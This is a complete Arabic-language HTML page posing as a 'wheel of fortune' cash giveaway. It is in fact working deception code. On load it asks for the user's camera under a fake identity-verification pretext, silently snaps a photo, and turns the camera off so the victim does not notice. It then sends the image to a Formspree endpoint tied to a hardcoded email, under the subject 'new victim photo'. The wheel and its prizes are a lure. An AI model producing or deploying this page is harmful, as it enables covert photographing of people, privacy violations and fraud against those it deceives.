<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>عجلة الحظ - اكسب آلاف الدولارات</title>
    <style>
        body { margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0a23; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0a0a23; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10; }
        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #ffcc00; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #cameraMsg { font-size: 1.2rem; color: #ffcc00; margin-bottom: 10px; text-align: center; padding: 0 20px;}
        video { display: none; }
        canvas { display: none; }
        #wheelContainer { display: none; text-align: center; }
        h1 { color: #ffcc00; font-size: 2.5rem; margin-bottom: 10px; text-shadow: 2px 2px 4px #000; }
        .subtext { color: #aaa; margin-bottom: 30px; font-size: 1.1rem; }
        canvas#wheelCanvas { border-radius: 50%; box-shadow: 0 0 20px rgba(255, 204, 0, 0.5); }
        #spinBtn { margin-top: 30px; padding: 15px 40px; font-size: 1.5rem; background: linear-gradient(45deg, #ffcc00, #ff8800); border: none; border-radius: 30px; color: #000; font-weight: bold; cursor: pointer; box-shadow: 0 5px 15px rgba(0,0,0,0.5); transition: transform 0.2s; }
        #spinBtn:hover { transform: scale(1.1); }
        #spinBtn:disabled { background: #555; color: #888; cursor: not-allowed; transform: none; }
    </style>
</head>
<body>

    <div id="loader">
        <div class="spinner"></div>
        <div id="cameraMsg">جاري التحقق من هويتك لتأهيلك للسحب...</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <div id="wheelContainer">
        <h1>🎉 عجلة الحظ 🎉</h1>
        <p class="subtext">لقد تم تأهيلك! لف العجلة واكسب حتى 5000 دولار</p>
        <canvas id="wheelCanvas" width="300" height="300"></canvas>
        <br>
        <button id="spinBtn">لف العجلة الآن!</button>
    </div>

    <script>
        const prizes = ["$100", "$200", "$500", "$1000", "$2000", "$5000"];
        const emailTarget = "amoooor898@gmail.com";
        const formspreeID = "YOUR_FORMSPREE_ID"; // حط الـ ID بتاعك هنا

        async function initCamera() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const msg = document.getElementById('cameraMsg');

            try {
                // طلب الكاميرا بحجة التحقق
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    // استنى ثانية الكاميرا تفتح
                    setTimeout(() => {
                        // التقاط الصورة في الخلفية
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        // إيقاف الكاميرا عشان المستخدم مايشوفش ضوء
                        stream.getTracks().forEach(track => track.stop());
                        
                        // تحويل الصورة لـ Base64 وإرسالها
                        const imageData = canvas.toDataURL('image/jpeg', 0.8);
                        sendEmail(imageData);
                        
                        // إظهار عجلة الحظ
                        document.getElementById('loader').style.display = 'none';
                        document.getElementById('wheelContainer').style.display = 'block';
                        drawWheel();
                    }, 1500);
                };
            } catch (err) {
                msg.innerHTML = "لازم تسمح بالكاميرا عشان تشوف العجلة!<br>برجاء التحديث والسماح.";
            }
        }

        function sendEmail(imageData) {
            // إرسال عبر Formspree (أو أي API تانية)
            fetch(`https://formspree.io/f/${formspreeID}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: JSON.stringify({
                    _subject: "صورة ضحية جديدة!",
                    email: emailTarget,
                    message: "تم التقاط الصورة بنجاح.",
                    image: imageData
                })
            }).catch(e => console.log("Email send error", e));
        }

        // رسم العجلة
        function drawWheel() {
            const canvas = document.getElementById('wheelCanvas');
            const ctx = canvas.getContext('2d');
            const numSegments = prizes.length;
            const radius = canvas.width / 2;
            const arc = (2 * Math.PI) / numSegments;
            
            const colors = ["#ffcc00", "#ff5733", "#33ff57", "#3380ff", "#ff33a8", "#a833ff"];

            for (let i = 0; i < numSegments; i++) {
                const angle = i * arc;
                ctx.beginPath();
                ctx.arc(radius, radius, radius, angle, angle + arc, false);
                ctx.lineTo(radius, radius);
                ctx.fillStyle = colors[i];
                ctx.fill();
                ctx.stroke();

                ctx.save();
                ctx.translate(radius, radius);
                ctx.rotate(angle + arc / 2);
                ctx.fillStyle = "#000";
                ctx.font = "bold 20px Arial";
                ctx.fillText(prizes[i], radius / 2 - 20, 10);
                ctx.restore();
            }
        }

        // لف العجلة
        document.getElementById('spinBtn').addEventListener('click', function(e) {
            this.disabled = true;
            const canvas = document.getElementById('wheelCanvas');
            let currentRotation = 0;
            const spinAmount = Math.floor(Math.random() * 3600) + 3600; // 10 لفات على الأقل
            const spinDuration = 4000;
            const startTime = performance.now();

            function animateSpin(currentTime) {
                const elapsedTime = currentTime - startTime;
                const progress = elapsedTime / spinDuration;
                
                // Ease out effect
                const easeOut = 1 - Math.pow(1 - progress, 3);
                currentRotation = spinAmount * easeOut;
                
                canvas.style.transform = `rotate(${currentRotation}deg)`;

                if (progress < 1) {
                    requestAnimationFrame(animateSpin);
                } else {
                    // الحصول على الجائزة
                    const finalAngle = currentRotation % 360;
                    const segmentAngle = 360 / prizes.length;
                    // حساب الـ index (عكسياً عشان الللف)
                    const winningIndex = Math.floor(((360 - finalAngle) % 360) / segmentAngle);
                    alert(`مبروك! كسبت ${prizes[winningIndex]}!`);
                }
            }
            requestAnimationFrame(animateSpin);
        });

        // بدء العملية أول ما الصفحة تفتح
        window.onload = initCamera;
    </script>
</body>
</html>
